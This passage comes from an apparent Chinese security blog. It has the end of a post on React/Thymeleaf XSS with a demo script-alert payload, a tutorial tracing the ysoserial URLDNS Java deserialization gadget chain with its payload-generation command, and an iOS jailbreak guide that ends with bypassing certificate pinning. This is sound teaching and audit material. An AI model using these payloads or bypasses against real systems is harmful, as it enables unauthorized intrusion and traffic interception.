class="keyword">this</span>.state = &#123;</span><br><span class="line">			content:<span class="string">'React XSS Demo &lt;script&gt;alert("seikei")&lt;/script&gt;'</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	render() &#123;</span><br><span class="line">		<span class="keyword">return</span> (</span><br><span class="line">			&lt;div&gt;</span><br><span class="line">				&lt;div&gt;</span><br><span class="line">					&#123;<span class="keyword">this</span>.state.content&#125;</span><br><span class="line">				&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">			&lt;div dangerouslySetInnerHTML=&#123;&#123;__html: this.state.content&#125;&#125; /</span>&gt;</span><br><span class="line"></span><br><span class="line">			&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">		)</span></span><br><span class="line"><span class="regexp">	ß&#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default SetHtml;</span></span><br></pre></td></tr></table></figure>



<blockquote>
<p><strong>代码审计关键</strong>：关注<code>dangerouslySetInnerHTML</code>，若用户输入在<code>dangerouslySetInnerHTML</code>中，可能导致XSS。</p>
</blockquote>
<p>来源：<a href="https://zh-hans.reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml" target="_blank" rel="noopener">https://zh-hans.reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml</a></p>
<h1 id="Thymeleaf"><a href="#Thymeleaf" class="headerlink" title="Thymeleaf"></a>Thymeleaf</h1><p>其实thymeleaf算不上前端框架，但是也能控制输入到前端页面的内容。在这里简单记录一下。</p>
<p>thymeleaf作为模版引擎，可以处理HTML，XML，JavaScript，CSS。thymeleaf有自己的XSS转义方法，thymeleaf模版在对<code>th:text</code>标签进行渲染的时候，默认对特殊字符进行了转义，所以我们输入的XSS payload是在输出时被转义的。</p>
<p>而<code>th:utext</code>不会将字符转义，这就会导致XSS产生。</p>
<blockquote>
<p><strong>代码审计关键</strong>：关注<code>th:utext</code>，<code>th:utext</code>中的内容用户可控则存在XSS。</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>理解Java反序列化-ysoserial URLDNS</title>
    <url>/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/</url>
    <content><![CDATA[<p>目前网上绝大部分 Java 反序列化漏洞文章都以 <code>CommonsCollections</code> 这条利用链作为教程，这条利用链其实特别复杂，用 <code>CommonsCollections</code> 作为 Java 反序列化入门教程未免太过硬核。</p>
<p>想要利用「不安全的反序列化」漏洞，就需要看被反序列化的类的 <code>readObject()</code> 是怎么写的。通常 Java 反序列化类中的 <code>readObject()</code> 方法很少会被重写，这也就是为什么「不安全的反序列化」利用链一般都只出现在通用 jar 包中。大部分反序列化的利用链较为复杂，甚至还需要多种 Java 特性来配合，比如反射、动态代理、JNDI注入等等，光了解这些特性就要花上不少时间。</p>
<p>这里通过 URLDNS 作为利用链来学习 Java 反序列化就会简单很多。</p>
<a id="more"></a>

<h1 id="一、利用"><a href="#一、利用" class="headerlink" title="一、利用"></a>一、利用</h1><p>使用 WebGoat 不安全的反序列化题目作为复现环境。</p>
<p><code>URLDNS</code> 是 ysoserial 工具的一个模块，作用是发起一个 DNS 请求，该模块方便在于利用广，仅靠 JDK 默认的 <code>java.util.Hashmap</code> 和 <code>java.net.URL</code> 即可完成反序列化的过程。并且利用链较短，有助于理解 Java 反序列化，利用链太长容易迷茫在利用链中的技术细节中。</p>
<p>ysoserial 中 URLDNS 模块的使用方法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS &quot;https:&#x2F;&#x2F;dns.example.com&quot;</span><br></pre></td></tr></table></figure>

<p>Burp Deserialization Scanner Exploiting 利用如下：</p>
<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/URLDNS-exploit.png" alt="URLDNS-exploit"></p>
<p>Burp Collaborator 得到如下返回，就这样非常简单的完成了一次反序列化的利用，利用反序列化发起了一次DNS请求。</p>
<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/burp-collaborator-result.png" alt="burp-collaborator-result"></p>
<h1 id="二、调试前准备"><a href="#二、调试前准备" class="headerlink" title="二、调试前准备"></a>二、调试前准备</h1><p>ysoserial 项目地址： <a href="https://github.com/frohoff/ysoserial/" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial/</a> ，git clone 或直接下载下来导入到编译器中，我这里使用的编译器是 IntelliJ IDEA。</p>
<p>ysoserial 项目结构如下，在 payloads 目录中可以看到 ysoserial 中所有的可利用类。</p>
<img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/ysoserial-payload.png" alt="ysoserial-payload" style="zoom:40%;">

<p>ysoserial 项目中存在 pom.xml 文件，表明这是一个由 maven 构建的项目。IntelliJ IDEA 会自动根据其中的配置下载依赖。</p>
<blockquote>
<p>POM（Project Object Model，即项目对象模型）是 Maven 工程的基本工作单元，是一个 XML 文件，包含了 Maven 用于构建项目的项目信息及各种配置信息，比如项目依赖，项目开发人员，版本，插件，组织信息、项目授权、项目的 url 等等。我们通过 POM 文件来完成对 Maven 项目的管理，构建等操作。</p>
</blockquote>
<p>如果 maven 依赖有问题，可以手工点击菜单里的 <code>Files - Project Structure</code>，然后配置 Libraries。</p>
<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/ysoserial-project-structure.png" alt="ysoserial-project-structure"></p>
<p>先输入需导入的包名，等待搜索完成，再选择相应的版本下载即可。</p>
<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/download-library-from-maven-repository.png" alt="download-library-from-maven-repository"></p>
<p>pom.xml 文件中 <code>maven-assembly-plugin</code> 就是一个用来打包项目的插件，可以把依赖、类文件什么的都打包在一起。其中存在 <code>&lt;mainClass&gt;</code>，表明 <code>ysoserial.GeneratePayload</code> 就是主类。</p>
<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/maven-mainClass.png" alt="maven-mainClass"></p>
<p>根据 pom.xml 中的 <code>&lt;mainClass&gt;</code> 找到找到 <code>GeneratePayload</code> 类，<code>main</code> 函数前有个绿色的小箭头，点击这个小箭头可选择从此 Debug（ 因为一个项目中可能存在多个 <code>main</code> 函数，所以通过这种方法快速找到运行时的主类）。</p>
<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-GeneratePayload.png" alt="debug-GeneratePayload"></p>
<p>此时就可以在我们需要的地方下断点，在 IntelliJ IDEA 中点击左侧栏即可设下断点，下图红色圆圈就是断点，调试过程中，程序运行到断点处就会停下。</p>
<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/URLDNS-hashmap.png" alt="URLDNS-hashmap"></p>
<p>如果此时直接开始调试只能在 console 中看到输出 usage 页面，ysoserial 需要添加参数来运行指定的 payloads 模块。</p>
<p>所以需要修改默认参数。修改路径/方法如下。打开 IDEA 右上角的 <code>Edit Configurations...</code></p>
<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/Edit-Configurations.png" alt="Edit-Configurations"></p>
<p>然后在 Program arguments 中输入参数 <code>URLDNS &quot;&lt;http://xxx.com&gt;&quot;</code></p>
<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/set-program-arguments.png" alt="set-program-arguments"></p>
<p>以上方法主要是调试整个程序，调试其他项目的思想大致如此。</p>
<p><em>ysoserial 可以不用单独调试，这里主要是为了记录方法/思想，以后遇到其他项目时就知道该怎么去调试了。</em></p>
<h1 id="三、反序列化过程调试"><a href="#三、反序列化过程调试" class="headerlink" title="三、反序列化过程调试"></a>三、反序列化过程调试</h1><h2 id="3-1-介绍"><a href="#3-1-介绍" class="headerlink" title="3.1 介绍"></a>3.1 介绍</h2><p>ysoserial 有那么多 payloads，调试整个程序是非常冗余的。ysoserial 提供了单独调试 payloads 的方法，每个 payload 的 <code>main</code> 方法中都有调用 <code>PayloadRunner</code> ，可以 Debug payload 的 <code>main</code> 函数来进行单独调试。不设置运行参数时会默认使用 <code>calc.exe</code> 作为参数来执行。</p>
<p>并且 PayloadRunner 会完成序列化到反序列化全部过程，就是从 payload 的生成到 <code>readObject()</code> 的读取。这样无需额外找反序列化环境来测试，方便快捷～</p>
<p>在 URLDNS 中点击 <code>main</code> 函数左侧的箭头进行 Debug</p>
<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-URLDNS-main.png" alt="debug-URLDNS-main"></p>
<p>单独调试 payload 同样需要添加参数，但无需指定模块，仅设置 DNSlog地址<code>&quot;http://xxx.com&quot;</code> 即可</p>
<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/set-program-arguments-URLDNS.png" alt="set-program-arguments-URLDNS"></p>
<p>URLDNS 中的 <code>getObject()</code> 方法中新建了一个 <code>HashMap</code> 类，并在 <code>HashMap</code> 中放置了一个 <code>java.net.URL</code> 类，url 是我们传入的参数。相比于其他 ysoserial 中的 payload，URLDNS 非常简单明了。</p>
<p>从中我们可以得知 URLDNS 序列化的是 <code>HashMap</code> 类，在之后反序列化的过程中，就能明确需要追踪的是 <code>HashMap -&gt; readObject()</code></p>
<h2 id="3-2-反序列化过程"><a href="#3-2-反序列化过程" class="headerlink" title="3.2 反序列化过程"></a>3.2 反序列化过程</h2><p>URLDNS 中 <code>main</code> 函数中用到 <code>PayloadRunner.run（URLDNS.class, args)</code></p>
<p><code>PayloadRunner</code> 在这里不是重点，就不单独介绍。<code>PayloadRunner</code> 代码分析可参考：<a href="http://1codelife.com/2017/09/17/Java-deserial-learning1/" target="_blank" rel="noopener">http://1codelife.com/2017/09/17/Java-deserial-learning1/</a></p>
<p><code>final Object objAfter = Deserializer.deserialize(serialized)</code> 表示调用反序列化过程，如下图断点处</p>
<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-deserialize.png" alt="debug-deserialize"></p>
<p><code>Deserializer</code> 类的 <code>deserialize</code> 方法处调用 <code>objIn.readObject()</code>，正式进入反序列化操作</p>
<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-objectinputstream-readobject.png" alt="debug-objectinputstream-readobject"></p>
<p>在反序列化过程前有一些概念需要理解：</p>
<ol>
<li>反序列化漏洞应该叫做「不安全的反序列化」漏洞，正常的反序列化是不存在危害的；</li>
<li>反序列化类必需实现 <code>Serializable</code> 接口，并重写 <code>readObject()</code> 方法；</li>
<li>未重写 <code>readObject()</code> 不存在「不安全的反序列化」漏洞；</li>
<li>即使重写 <code>readObject()</code> 也不一定就存在「不安全的反序列化」漏洞，还需要看重写的内容，是否可构造「有效利用链」；</li>
<li>序列化对象被反序列化时会调用序列化对象的<code>readObject()</code>方法。</li>
</ol>
<p>第 5 点可能不太好理解，就以 URLDNS 来举例，上图断点处是 <code>objIn.readObject()</code> ，<code>objIn</code>是<code>ObjectInputStream</code>对象，可以理解为执行的是 <code>ObjectInputStream.readObject()</code> 。此处 <code>readObject()</code> 的作用是读取传入的序列化对象。</p>
<p>此时我们传入一个 <code>HashMap</code> 的序列化对象，<code>ObjectInputStream.readObjec()</code> 会读取该序列化对象，进行反序列化操作，反序列化过程中会执行序列化对象的 <code>readObject()</code> 方法，也就是执行 <code>HashMap.readObject()</code> 方法。</p>
<blockquote>
<p>两个 <code>readObject()</code> 都会执行，但两者的作用不同。利用链开始的 <code>readObject()</code> 是后者。</p>
</blockquote>
<p>想要利用「不安全的反序列化」漏洞，就需要看序列化对象的 <code>readObject()</code> 是怎么写的。通常 Java 序列化类中的 <code>readObject()</code> 方法很少会被重写，这也就是为什么「不安全的反序列化」一般都只出现在通用 jar 包中。且每一个反序列化的利用链都非常复杂，甚至还需要多种 Java 特性来配合，比如反射、动态代理、JNDI 注入等等，光了解这些特性就要花上不少时间。</p>
<p>从 <code>ObjectInputStream.readObject()</code> 到 <code>HashMap.readObject()</code> 过程中会经过多个 <code>java.io</code> 和 <code>sun.reflect</code> 类中方法的调用 ，见下图调用栈，<strong>这是 Java 反序列化中最需要理解的一步</strong>。</p>
<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/readobject-stack.png" alt="readobject-stack"></p>
<p>从此开始反序列化利用链的分析，<code>HashMap -&gt; readObject()</code> 代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        reinitialize();</span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Illegal load factor: "</span> +</span><br><span class="line">                                             loadFactor);</span><br><span class="line">        s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">        <span class="keyword">int</span> mappings = s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">        <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Illegal mappings count: "</span> +</span><br><span class="line">                                             mappings);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">            <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">            <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">            <span class="keyword">float</span> lf = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">            <span class="keyword">float</span> fc = (<span class="keyword">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">            <span class="keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                       DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                       (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                       MAXIMUM_CAPACITY :</span><br><span class="line">                       tableSizeFor((<span class="keyword">int</span>)fc));</span><br><span class="line">            <span class="keyword">float</span> ft = (<span class="keyword">float</span>)cap * lf;</span><br><span class="line">            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                         (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check Map.Entry[].class since it's the nearest public type to</span></span><br><span class="line">            <span class="comment">// what we're actually creating.</span></span><br><span class="line">            SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[]<span class="class">.<span class="keyword">class</span>, <span class="title">cap</span>)</span>;</span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(&#123;<span class="string">"rawtypes"</span>,<span class="string">"unchecked"</span>&#125;)</span><br><span class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[cap];</span><br><span class="line">            table = tab;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                    K key = (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                    V value = (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>咋一看 <code>readObject()</code> 方法并不会有特别明显的异常，其实重点在最后一行 <code>putVal(hash(key), key, value, false, false)</code>的 <code>hash()</code> 方法，计算 key 的 hash 值（在这下断点会方便后续快速调试）</p>
<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-putVal.png" alt="debug-putVal"></p>
<blockquote>
<p>使用 IntelliJ IDEA 调试在这里会碰到问题，可能调试不会步进 hash 方法，而是直接步进 putVal 方法中，具体原因可看最下方附录。</p>
</blockquote>
<p>步进 <code>hash</code> 方法，看到其中调用了 key 的 <code>hashCode</code> 方法</p>
<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-hashCode.png" alt="debug-hashCode"></p>
<p>继续步进 <code>hashCode</code>，因为 key 是一个 <code>java.net.URL</code> 对象，就会跳到<code>URL -&gt; hashCode</code> 方法</p>
<p>可以看到这里会判断<code>hashCode != -1</code>，这也是为什么构造 payload 时会将 hashCode 赋值为 -1</p>
<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/hashCode-not-equal-minus-one.png" alt="hashCode-not-equal-minus-one"></p>
<p>此处 <code>handler</code> 是 <code>URLStreamHandler</code> 的一个对象，由 <code>transient URLStreamHandler handler</code> 创建。继续步进 <code>hashCode</code> 方法。</p>
<p>在 359 行看到 <code>getHostAddress</code>，步进该方法</p>
<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-getHostAddress.png" alt="debug-getHostAddress"></p>
<p>这⾥ <code>InetAddress.getByName(host)</code> 的作⽤是根据主机名，获取其 IP 地址，在⽹络上就是⼀次 DNS 查询。</p>
<p>其实到这⾥反序列化的调试就可以结束了，后续是具体发起 DNS 查询的步骤。</p>
<p>我们也可再继续步进</p>
<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-InetAddress-getByName.png" alt="debug-InetAddress-getByName"></p>
<p>中间略过几步…</p>
<p>直接到关键步骤 <code>nameService.lookupAllHostAddr(host)</code>，正是从此处发起 DNS 查询。</p>
<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-InetAddress.getAllByName.png" alt="debug-InetAddress.getAllByName"></p>
<p>下图是从 <code>HashMap -&gt; readObject()</code> 开始到 DNS 请求执行的调用栈，这是 ysoserial payloads 中最简单的调用栈。</p>
<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-URLDNS-stack.png" alt="debug-URLDNS-stack"></p>
<p>整个 URLDNS 的利用链可以简单概括成：</p>
<ol>
<li>HashMap -&gt; readObject()</li>
<li>HashMap -&gt; hash()</li>
<li>URL -&gt; hashCode()</li>
<li>URLStreamHandler -&gt; hashCode()</li>
<li>URLStreamHandler -&gt; getHostAddress()</li>
<li>InetAddress -&gt; getByName()</li>
<li>…</li>
</ol>
<h1 id="四、构造利用链"><a href="#四、构造利用链" class="headerlink" title="四、构造利用链"></a>四、构造利用链</h1><p>知道了反序列化的过程，就能据此构造利用链，利用链也叫做 “Gadget chains”。</p>
<p>要构造这个 Gadget ，只需要初始化⼀个 <code>java.net.URL</code> 对象，作为 key 放在 <code>java.util.HashMap</code> 中；然后，设置这个 URL 对象的 hashCode 为初始值 -1 ，这样反序列化时将会重新计算其 hashCode，才能触发到后⾯的 DNS 请求，否则不会调⽤ <code>URL -&gt; hashCode()</code> 。</p>
<blockquote>
<p>这里 hashCode 必须设置为 -1</p>
</blockquote>
<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/hashCode-not-equal-minus-one.png" alt="hashCode-not-equal-minus-one"></p>
<p>另外，URLDNS 为了防⽌在⽣成 Payload 的时候也执⾏了 URL 请求和 DNS 查询，所以重写了⼀ 个 <code>SilentURLStreamHandler</code> 类，但这不是必须的。</p>
<p>URLDNS 中的注释也存在相应的说明，可在 ysoserial 项目代码 <a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a> 中查看。</p>
<h1 id="五、对反序列化的理解"><a href="#五、对反序列化的理解" class="headerlink" title="五、对反序列化的理解"></a>五、对反序列化的理解</h1><p>Java 反序列化漏洞核心就是执行被反序列化类的 <code>readObject()</code> 方法，<code>readObject()</code> 是整个利用链的起点。纵观整个反序列化的过程，最难的是利用链的构造。</p>
<p>一个系统存在反序列化漏洞需要满足以下条件：</p>
<ol>
<li>需要可接收用户数据的<code>ObjectInputStream -&gt; readObject()</code></li>
<li>存在有效利用链的 lib/jar 包（一般不太可能根据程序自身的反序列化类构造一个利用链，除非白盒测试）</li>
</ol>
<p>正常的反序列化类是没有危害的。只有当「被反序列化的类」重写了 <code>readObject()</code> 方法，且重写方法中存在「利用链」才属于不安全的。因为在「被反序列化的类」被反序列化时会自动执行 <code>readObject()</code> 方法，所以首先需要的是重写 <code>readObject()</code>，其次是重写的方法中存在「有效的利用链」。这里「利用链」有的是通过反射，有的是通过动态代理，有的是通过 JNDI 注入等等方法才导致最后的 RCE 。</p>
<p>「被反序列化的类」一般都是 lib/jar 包中的类。正常情况下，普通系统的开发在正常情况下很少会重写 <code>readObject()</code> 且存在「有效的利用链」（普通的开发都是功能型开发，很少用到反序列化，由于 Json 的普及使得极少情况下才需要手写序列化的类<del>（结果Jackson和fastjson产生了大量的反序列化漏洞）</del>）。目前曝出来的大部分反序列化利用的都是 lib/jar 包中的类，这些类为了通用性就会写出一些特殊的 <code>readObject()</code> 方法，这也导致一些花式攻击手法的产生。</p>
<h1 id="六、代码审计"><a href="#六、代码审计" class="headerlink" title="六、代码审计"></a>六、代码审计</h1><p>搞清楚 Java 反序列化，以后代码审计就着重注意 <code>ObjectInputStream -&gt; readObject()</code> 方法是否用户可控。</p>
<p>若用户可控，就再去找 lib 目录中是否存在 ysoserial payload 中已有的 jar 包，有的话就能直接认为该处存在反序列化漏洞。或者查看 Java 版本，若低于 <code>Jdk7u21</code>也能造成 RCE。</p>
<p>即使以上都没有，该处也算是一个风险点，说不定以后会有新的 Gadget 被发现。</p>
<h1 id="七、附录"><a href="#七、附录" class="headerlink" title="七、附录"></a>七、附录</h1><h2 id="报错相关"><a href="#报错相关" class="headerlink" title="报错相关"></a>报错相关</h2><p>URLDNS 参数需加上相应协议，如 <code>http://</code>、<code>https://</code> ，若不加具体协议，会产生如下错误：</p>
<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/ysoserial-URLDNS-error.png" alt="ysoserial-URLDNS-error"></p>
<p>亲测 ysoserial 不能在 Java 11 中使用，我的 Java 环境为 <code>java 1.8.0_221</code>。Java 1.8 还是稳～</p>
<h2 id="IntelliJ-IDEA-会默认步过-JDK-中的方法"><a href="#IntelliJ-IDEA-会默认步过-JDK-中的方法" class="headerlink" title="IntelliJ IDEA 会默认步过 JDK 中的方法"></a>IntelliJ IDEA 会默认步过 JDK 中的方法</h2><h3 id="方法1-使用-Force-Step-Into"><a href="#方法1-使用-Force-Step-Into" class="headerlink" title="方法1  使用 Force Step Into"></a>方法1  使用 Force Step Into</h3><p>可以使用 Force Step Into 强制步进，简单粗暴。</p>
<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/force-step-into.png" alt="force-step-into"></p>
<h3 id="方法2-取消-Do-not-step-into-the-classes"><a href="#方法2-取消-Do-not-step-into-the-classes" class="headerlink" title="方法2  取消 Do not step into the classes"></a>方法2  取消 Do not step into the classes</h3><p>IntelliJ IDEA 默认在调试选项中关闭了对 JDK 源码的调试支持，需要在设置中取消勾选</p>
<p>Mac 中设置路径为 <code>IntelliJ IDEA → Preferences...</code> ，快捷键 <code>⌘ Cmd + ,</code></p>
<p>Windows 中设置路径为 <code>File → Setting</code></p>
<p>打开设置界面后在 Build, Execution, Deployment → Debugger → Stepping → Do not step into the classes → 取消勾选 <code>java.*</code> 和 <code>javax.*</code></p>
<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/Do-step-into-the-classes.png" alt="Do-step-into-the-classes"></p>
<p>设置之后调试时不会自动跳过 <code>java.*</code> 和 <code>javax.*</code> 类。</p>
]]></content>
  </entry>
  <entry>
    <title>iOS 12.4越狱+配置过程记录</title>
    <url>/2020/03/31/iOS-jailbreak/</url>
    <content><![CDATA[<h1 id="越狱"><a href="#越狱" class="headerlink" title="越狱"></a>越狱</h1><p>在 <a href="https://checkra.in/#release" target="_blank" rel="noopener">https://checkra.in/#release</a> 中下载，其中能越狱的设备有iPhone 5s – iPhone X, iOS 12.3 and up</p>
<p>我的设备是iPhone SE(A9)，iOS版本12.4</p>
<a id="more"></a>

<img src="/2020/03/31/iOS-jailbreak/checkra1n-latest-release.png" alt="checkra1n-latest-release" style="zoom: 67%;">

<p>下载完成后，将手机通过数据线连接Mac，运行checkra1n，点击start</p>
<img src="/2020/03/31/iOS-jailbreak/run-checkra1n.png" alt="run-checkra1n" style="zoom:43%;">

<p>一直点击next，直到如下画面，根据以下提示按键</p>
<ol>
<li>点击Start</li>
<li>同时按住关机键和home键</li>
<li>松开关机键，持续按住home键</li>
</ol>
<img src="/2020/03/31/iOS-jailbreak/checkra1n-start-jailbreak.png" alt="checkra1n-start-jailbreak" style="zoom: 43%;">

<p>之后等待一会，程序安装完成之后，iPhone会重启。</p>
<p>重启完成后输入密码，进行系统，点开checkra1n应用，安装Cydia。</p>
<p>（安装Cydia最好翻墙，翻墙很快下完，不翻墙下载失败）</p>
<img src="/2020/03/31/iOS-jailbreak/checkra1n-jailbreak-success.png" alt="checkra1n-jailbreak-success" style="zoom:33%;">

<p>整个越狱流程就结束了，非常简单快捷。</p>
<h1 id="iProxy"><a href="#iProxy" class="headerlink" title="iProxy"></a>iProxy</h1><p>安装完Cydia之后可以来安装iProxy。iProxy的用处是通过USB进行SSH连接手机，虽然Wi-Fi就能通过SSH连接，但是稳定性和传输速度比不上USB。</p>
<p>在Mac上执行：<code>brew install libusbmuxd</code>，安装完成之后将手机的端口映射到其他端口上：<code>iproxy 2222 22</code>,在令一个终端页面输入<code>ssh root@localhost -p 2222</code>开始连接，密码是alpine。</p>
<p>⚠️ 我连接SSH时出现问题，报错内容如下</p>
<img src="/2020/03/31/iOS-jailbreak/iproxy-error.png" alt="iproxy-error" style="zoom:50%;">

<p>我的解决办法就是重新安装openssh，重装后就能正常连接</p>
<img src="/2020/03/31/iOS-jailbreak/iproxy-success.png" alt="iproxy-success" style="zoom:50%;">



<h1 id="Frida-and-Objection"><a href="#Frida-and-Objection" class="headerlink" title="Frida and Objection"></a>Frida and Objection</h1><p>Frida安装教程：<a href="https://frida.re/docs/ios/" target="_blank" rel="noopener">https://frida.re/docs/ios/</a></p>
<p>在Mac执行：<code>pip3 install frida-tools</code></p>
<p>需要在iPhone上执行的操作：打开Cydia -&gt; 点击底部栏“软件源” -&gt; 点击右上角“编辑” -&gt; 点击左上角“添加”，然后输入 <a href="https://build.frida.re" target="_blank" rel="noopener">https://build.frida.re</a></p>
<p>完成之后，点击新增的源找到“build.frida.re”点击进去，里面有三个可选项，分别是“Frida for 32-bit devices”、“Frida for A12+ devices”、“Frida for pre-A12 devices”，32-bit是iPhone 5s和iPad Air（不含）以下的设备，A12+是iPhone X（不含）以上的设备。</p>
<p>因为我的设备是iPhone SE，芯片型号是A9，所以选择“Frida for pre-A12 devices”</p>
<p>安装完Firda之后，继续安装Objection。</p>
<p>在Mac上执行<code>pip3 install objection</code>，安装完成之后可以运行<code>objection --gadget &quot;com.apple.AppStore&quot; explore</code>来测试一下</p>
<img src="/2020/03/31/iOS-jailbreak/objection-install.png" alt="objection-install" style="zoom:50%;">



<p>⚠️ 如果安装的是“Frida for A12+ devices”，使用Frida时需要开启Xcode来挂载硬盘镜像。</p>
<img src="/2020/03/31/iOS-jailbreak/objection-error.png" alt="objection-error" style="zoom:50%;">



<h1 id="证书配置和安装SSL-Kill-Switch-2"><a href="#证书配置和安装SSL-Kill-Switch-2" class="headerlink" title="证书配置和安装SSL Kill Switch 2"></a>证书配置和安装SSL Kill Switch 2</h1><p>证书配置非常简单，设置好burp代理，访问 <a href="http://burp" target="_blank" rel="noopener">http://burp</a> ，安装证书。</p>
<p>安装证书之后在 设置 -&gt; 通用 -&gt; 描述文件 -&gt; PortSwigger CA，点击安装。</p>
<p>再到 通用 -&gt; 关于本机 -&gt; 证书信任设置，选上PortSwigger即可。</p>
<img src="/2020/03/31/iOS-jailbreak/certificate-trust.png" alt="certificate-trust" style="zoom:33%;">



<p>重点是安装SSL Killing，app测试时很多应用都会强制使用certificate pinning导致无法抓包，安装<a href="https://github.com/nabla-c0d3/ssl-kill-switch2" target="_blank" rel="noopener">SSL Kill Switch 2</a>可帮助我们绕过certificate pinning。</p>
<ol>
<li>安装前先确定Cydia中安装了以下packages：<code>wget</code>、<code>Debian Packager</code>、<code>Cydia Substrate</code>、<code>PreferenceLoader</code></li>
</ol>
<p>⚠️ 找不到PreferenceLoader，可添加源：<a href="https://rpetri.ch/repo" target="_blank" rel="noopener">https://rpetri.ch/repo</a> ，再安装。</p>
<ol start="2">
<li>在<a href="https://github.com/nabla-c0d3/ssl-kill-switch2/releases" target="_blank" rel="noopener">SSL Kill Switch 2 release</a>中复制最新的<code>.deb</code>链接</li>
